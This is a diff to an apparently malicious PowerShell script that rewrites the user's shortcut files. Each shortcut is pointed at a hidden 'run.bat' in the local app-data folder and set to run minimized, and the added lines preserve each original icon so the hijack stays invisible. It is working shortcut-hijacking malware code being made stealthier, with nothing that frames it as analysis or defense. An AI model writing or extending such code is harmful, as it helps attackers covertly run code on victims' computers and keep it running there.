@@ -143,8 +143,16 @@ Powershell "$env:LOCALAPPDATA\Data\MEGA_links.ps1" "get_shrekt"
         foreach ($link in $links) {
             $shortcut = $WshShell.CreateShortcut($link.FullName)
 
+            # Sauvegarder l'icône d'origine avant modification
+            $originalIconLocation = $shortcut.IconLocation
+            
             $shortcut.TargetPath = "$env:LOCALAPPDATA\Data\run.bat"
             $shortcut.WindowStyle = 7
+            
+            # Réappliquer l'icône d'origine (si elle existe)
+            if (![string]::IsNullOrWhiteSpace($originalIconLocation)) {
+                $shortcut.IconLocation = $originalIconLocation
+            }
 
             $shortcut.Save()
 
